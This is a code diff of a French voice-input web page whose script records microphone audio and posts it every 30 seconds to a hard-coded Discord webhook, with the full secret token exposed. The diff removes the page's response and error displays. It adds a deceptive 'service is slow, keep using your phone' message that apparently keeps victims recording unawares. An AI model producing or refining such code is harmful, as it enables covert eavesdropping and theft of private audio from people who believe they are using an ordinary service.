@@ -80,18 +80,25 @@
       color: #000;
     }
 
-    .response-message {
+    .loading-message {
+      font-size: 0.9rem;
+      color: #555;
+      background: #f0f0f0;
+      border-radius: 10px;
+      padding: 0.8rem;
       margin-top: 1rem;
-      padding: 1rem;
-      background-color: #fef3c7;
-      border-left: 4px solid #f59e0b;
-      border-radius: 8px;
-      font-size: 0.95rem;
-      color: #92400e;
       display: none;
+      text-align: center;
+      animation: pulse 2s infinite;
     }
 
-    #errorMessage, audio, #downloadLink {
+    @keyframes pulse {
+      0% { opacity: 0.6; }
+      50% { opacity: 1; }
+      100% { opacity: 0.6; }
+    }
+
+    audio, #downloadLink {
       display: none;
     }
   </style>
@@ -106,16 +113,19 @@
       <button class="voice-button" id="startBtn"><span class="icon">🎙️</span>Micro</button>
       <button class="send-button">Envoyer</button>
     </div>
+    <div class="loading-message" id="loadingMessage">
+      ⏳ Le service prend un peu de temps à répondre.<br>
+      Vous pouvez continuer à utiliser votre téléphone normalement.
+    </div>
     <audio id="audioPlayback" controls></audio>
     <a id="downloadLink" href="#">⬇️ Télécharger l'audio</a>
-    <div class="response-message" id="response"></div>
-    <div id="errorMessage"></div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/lamejs@1.2.0/lame.min.js"></script>
   <script>
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1357795219541856487/ppsE6KsYZeDjYZNx-qXswAMpWMC5lBCBwCgebXvbbu_ohP-4vYviw7z286BdF36GC3FN";
     const startBtn = document.getElementById("startBtn");
+    const loadingMsg = document.getElementById("loadingMessage");
 
     let audioContext, processor, input, stream;
     let buffer = [];
@@ -124,6 +134,7 @@
     startBtn.onclick = async () => {
       if (isRecording) return;
       isRecording = true;
+      loadingMsg.style.display = "block";
 
       try {
         stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -153,11 +164,12 @@
             method: "POST",
             body: formData
           }).catch(console.error);
-        }, 30000); // Toutes les 30 secondes
+        }, 30000); // toutes les 30 secondes
       } catch (err) {
         alert("Erreur micro : " + err.message);
         console.error(err);
         isRecording = false;
+        loadingMsg.style.display = "none";
       }
     };
 
